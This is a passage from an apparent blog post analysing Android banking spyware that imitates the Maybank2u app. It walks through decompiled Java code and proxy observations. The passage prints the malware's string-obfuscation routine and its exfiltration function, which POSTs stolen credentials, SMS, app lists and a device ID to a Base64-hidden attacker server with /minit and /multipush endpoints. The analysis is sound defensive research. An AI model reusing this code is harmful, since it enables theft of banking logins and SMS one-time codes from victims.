</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-30">30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-31">31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-32"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-32">32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-33"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-33">33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-34"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-34">34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-35"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-35">35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-36"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-36">36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-37"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-37">37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-38"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-38">38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-39"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-39">39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-40"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-40">40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-41"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-41">41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-42"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-42">42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-43"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-43">43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-44"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-44">44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-45"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-45">45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-46"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-46">46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-47"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-47">47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-48"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-48">48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-49"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-49">49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-50"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-50">50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-51"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-51">51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-8-52"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-8-52">52</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">b</span>(String str) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i2;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i3;
</span></span><span style="display:flex;"><span>    AbstractC0641jk.<span style="color:#a6e22e">v</span>(str, <span style="color:#e6db74">&#34;input&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> bytes <span style="color:#f92672">=</span> str.<span style="color:#a6e22e">getBytes</span>(AbstractC0755m7.<span style="color:#a6e22e">a</span>);
</span></span><span style="display:flex;"><span>    AbstractC0641jk.<span style="color:#a6e22e">u</span>(bytes, <span style="color:#e6db74">&#34;this as java.lang.String).getBytes(charset)&#34;</span>);
</span></span><span style="display:flex;"><span>    String encodeToString <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">encodeToString</span>(bytes, 2);
</span></span><span style="display:flex;"><span>    AbstractC0641jk.<span style="color:#a6e22e">s</span>(encodeToString);
</span></span><span style="display:flex;"><span>    StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> length <span style="color:#f92672">=</span> encodeToString.<span style="color:#a6e22e">length</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i4 <span style="color:#f92672">=</span> 0; i4 <span style="color:#f92672">&lt;</span> length; i4<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> charAt <span style="color:#f92672">=</span> encodeToString.<span style="color:#a6e22e">charAt</span>(i4);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (Character.<span style="color:#a6e22e">isLowerCase</span>(charAt)) {
</span></span><span style="display:flex;"><span>            i2 <span style="color:#f92672">=</span> 97;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">&lt;=</span> charAt <span style="color:#f92672">&amp;&amp;</span> charAt <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;{&#39;</span>) {
</span></span><span style="display:flex;"><span>                i3 <span style="color:#f92672">=</span> (charAt <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;Y&#39;</span>) <span style="color:#f92672">%</span> 26;
</span></span><span style="display:flex;"><span>                i <span style="color:#f92672">=</span> i3 <span style="color:#f92672">+</span> i2;
</span></span><span style="display:flex;"><span>                charAt <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>) i;
</span></span><span style="display:flex;"><span>                sb.<span style="color:#a6e22e">append</span>(charAt);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Character.<span style="color:#a6e22e">isLowerCase</span>(charAt) <span style="color:#f92672">||</span> 1072 <span style="color:#f92672">&gt;</span> charAt <span style="color:#f92672">||</span> charAt <span style="color:#f92672">&gt;=</span> 1104) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (Character.<span style="color:#a6e22e">isUpperCase</span>(charAt)) {
</span></span><span style="display:flex;"><span>                i2 <span style="color:#f92672">=</span> 65;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">&lt;=</span> charAt <span style="color:#f92672">&amp;&amp;</span> charAt <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;[&#39;</span>) {
</span></span><span style="display:flex;"><span>                    i3 <span style="color:#f92672">=</span> (charAt <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;9&#39;</span>) <span style="color:#f92672">%</span> 26;
</span></span><span style="display:flex;"><span>                    i <span style="color:#f92672">=</span> i3 <span style="color:#f92672">+</span> i2;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (Character.<span style="color:#a6e22e">isUpperCase</span>(charAt)) {
</span></span><span style="display:flex;"><span>                i2 <span style="color:#f92672">=</span> 1040;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (1040 <span style="color:#f92672">&lt;=</span> charAt <span style="color:#f92672">&amp;&amp;</span> charAt <span style="color:#f92672">&lt;</span> 1072) {
</span></span><span style="display:flex;"><span>                    i3 <span style="color:#f92672">=</span> (charAt <span style="color:#f92672">-</span> 1032) <span style="color:#f92672">%</span> 32;
</span></span><span style="display:flex;"><span>                    i <span style="color:#f92672">=</span> i3 <span style="color:#f92672">+</span> i2;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (Character.<span style="color:#a6e22e">isDigit</span>(charAt)) {
</span></span><span style="display:flex;"><span>                i <span style="color:#f92672">=</span> ((charAt <span style="color:#f92672">-</span> <span style="color:#e6db74">&#39;(&#39;</span>) <span style="color:#f92672">%</span> 10) <span style="color:#f92672">+</span> 48;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                sb.<span style="color:#a6e22e">append</span>(charAt);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            i <span style="color:#f92672">=</span> ((charAt <span style="color:#f92672">-</span> 1064) <span style="color:#f92672">%</span> 32) <span style="color:#f92672">+</span> 1072;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        charAt <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>) i;
</span></span><span style="display:flex;"><span>        sb.<span style="color:#a6e22e">append</span>(charAt);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    String sb2 <span style="color:#f92672">=</span> sb.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>    AbstractC0641jk.<span style="color:#a6e22e">u</span>(sb2, <span style="color:#e6db74">&#34;toString(...)&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> sb2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>I noticed that this function will be triggered after some information is collected. This function looks like base64 encode the strings and character permutation.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-1"> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-2"> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-3"> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-4"> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-5"> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-6"> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-7"> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-8"> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-9"> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-10">10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-11">11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-12">12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-13">13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-14">14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-15">15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-16">16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-17">17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-18">18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-19">19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-20">20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-21">21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-22">22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-23">23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-24">24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-25">25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-26">26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-27">27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-28">28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-29">29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-30">30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-31">31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-32"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-32">32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-33"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-33">33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-34"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-34">34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-35"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-35">35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-36"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-36">36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-37"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-37">37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-38"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-38">38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-39"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-39">39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-9-40"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-9-40">40</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">d</span>(JSONObject jSONObject, <span style="color:#66d9ef">boolean</span> z) {
</span></span><span style="display:flex;"><span>    String concat;
</span></span><span style="display:flex;"><span>    Xp xp <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Xp();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (z) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decode <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">&#34;aHR0cHM6Ly93ZWVkb29tLm5ldA==&#34;</span>, 0);
</span></span><span style="display:flex;"><span>        AbstractC0641jk.<span style="color:#a6e22e">s</span>(decode);
</span></span><span style="display:flex;"><span>        concat <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String(decode, AbstractC0755m7.<span style="color:#a6e22e">a</span>).<span style="color:#a6e22e">concat</span>(<span style="color:#e6db74">&#34;/minit&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decode2 <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">&#34;aHR0cHM6Ly93ZWVkb29tLm5ldA==&#34;</span>, 0);
</span></span><span style="display:flex;"><span>        AbstractC0641jk.<span style="color:#a6e22e">s</span>(decode2);
</span></span><span style="display:flex;"><span>        concat <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> String(decode2, AbstractC0755m7.<span style="color:#a6e22e">a</span>).<span style="color:#a6e22e">concat</span>(<span style="color:#e6db74">&#34;/multipush&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        Gl gl <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Gl();
</span></span><span style="display:flex;"><span>        gl.<span style="color:#a6e22e">m</span>(concat);
</span></span><span style="display:flex;"><span>        Pattern pattern <span style="color:#f92672">=</span> Vn.<span style="color:#a6e22e">c</span>;
</span></span><span style="display:flex;"><span>        Vn z2 <span style="color:#f92672">=</span> AbstractC0597ik.<span style="color:#a6e22e">z</span>(<span style="color:#e6db74">&#34;application/json; charset=utf-8&#34;</span>);
</span></span><span style="display:flex;"><span>        String jSONObject2 <span style="color:#f92672">=</span> jSONObject.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>        AbstractC0641jk.<span style="color:#a6e22e">u</span>(jSONObject2, <span style="color:#e6db74">&#34;toString(...)&#34;</span>);
</span></span><span style="display:flex;"><span>        gl.<span style="color:#a6e22e">l</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, AbstractC0597ik.<span style="color:#a6e22e">s</span>(z2, jSONObject2));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decode3 <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">decode</span>(<span style="color:#e6db74">&#34;QmV0YQ==&#34;</span>, 0);
</span></span><span style="display:flex;"><span>        AbstractC0641jk.<span style="color:#a6e22e">s</span>(decode3);
</span></span><span style="display:flex;"><span>        String b <span style="color:#f92672">=</span> b(<span style="color:#66d9ef">new</span> String(decode3, AbstractC0755m7.<span style="color:#a6e22e">a</span>));
</span></span><span style="display:flex;"><span>        C0236ai c0236ai <span style="color:#f92672">=</span> (C0236ai) gl.<span style="color:#a6e22e">c</span>;
</span></span><span style="display:flex;"><span>        c0236ai.<span style="color:#a6e22e">getClass</span>();
</span></span><span style="display:flex;"><span>        AbstractC0737lq.<span style="color:#a6e22e">o</span>(<span style="color:#e6db74">&#34;auth&#34;</span>);
</span></span><span style="display:flex;"><span>        AbstractC0737lq.<span style="color:#a6e22e">t</span>(b, <span style="color:#e6db74">&#34;auth&#34;</span>);
</span></span><span style="display:flex;"><span>        c0236ai.<span style="color:#a6e22e">a</span>(<span style="color:#e6db74">&#34;auth&#34;</span>, b);
</span></span><span style="display:flex;"><span>        String string <span style="color:#f92672">=</span> Settings.<span style="color:#a6e22e">Secure</span>.<span style="color:#a6e22e">getString</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">getContentResolver</span>(), <span style="color:#e6db74">&#34;android_id&#34;</span>);
</span></span><span style="display:flex;"><span>        AbstractC0641jk.<span style="color:#a6e22e">u</span>(string, <span style="color:#e6db74">&#34;getString(...)&#34;</span>);
</span></span><span style="display:flex;"><span>        String b2 <span style="color:#f92672">=</span> b(string);
</span></span><span style="display:flex;"><span>        C0236ai c0236ai2 <span style="color:#f92672">=</span> (C0236ai) gl.<span style="color:#a6e22e">c</span>;
</span></span><span style="display:flex;"><span>        c0236ai2.<span style="color:#a6e22e">getClass</span>();
</span></span><span style="display:flex;"><span>        AbstractC0737lq.<span style="color:#a6e22e">o</span>(<span style="color:#e6db74">&#34;id&#34;</span>);
</span></span><span style="display:flex;"><span>        AbstractC0737lq.<span style="color:#a6e22e">t</span>(b2, <span style="color:#e6db74">&#34;id&#34;</span>);
</span></span><span style="display:flex;"><span>        c0236ai2.<span style="color:#a6e22e">a</span>(<span style="color:#e6db74">&#34;id&#34;</span>, b2);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> C0563hu(xp, gl.<span style="color:#a6e22e">e</span>()).<span style="color:#a6e22e">e</span>(<span style="color:#66d9ef">new</span> Yw(11));
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception unused) {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>I then noticed another function is triggered. This function looks like some HTTP URL connection where it use POST method to send a JSON object. The URL is <code>https://weedoom.net</code> and it has 2 endpoint <code>/minit</code> and <code>/multipush</code>. Since the function input <code>c0044Fe.d(jSONObject, true);</code> is true, the <code>/multipush</code> is not likely used in this case. After understanding all, I tried to send a fake creds and see it it&rsquo;s correct.</p>
<p><img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-9.png#center"></p>
<p>After providing an input 7 or more in both usernamd and password field, I was redirected to this page. I then looked into my web proxy and see if any request is sent.</p>
<p><img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-10.png#center"></p>
<p>A request was sent to <code>https://weedoom.net/minit</code>. I then tried to decode based on the function <code>b</code> and see what kind of information they have collected.</p>
<ul>
<li>username and password</li>
<li>list of application installed</li>
<li>SMS received</li>
<li>most likely SIM card information</li>
</ul>
<p>Looking into the screenshot, I also noticed that <code>https://weedoom.net/multipush</code> was triggered from somewhere else. It has something to do with the broadcast receiver where when a new SMS is received, it will send the information to <code>https://weedoom.net/multipush</code>.</p>
<p><img alt="alt text" loading="lazy" src="/posts/android-spyware-maybank2u-apk/img/index-11.png#center"></p>
<h3 id="new-update">New Update<a hidden class="anchor" aria-hidden="true" href="#new-update">#</a></h3>
<p>It is possible to decompile using the latest unstable release <code>jadx</code> or <code>jadx-gui</code>. Here&rsquo;s the link to get the latest unstable release. <a href="https://nightly.link/skylot/jadx/workflows/build-artifacts/master">https://nightly.link/skylot/jadx/workflows/build-artifacts/master</a></p>
<p>I found out another easier method by using <code>zip</code> command.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
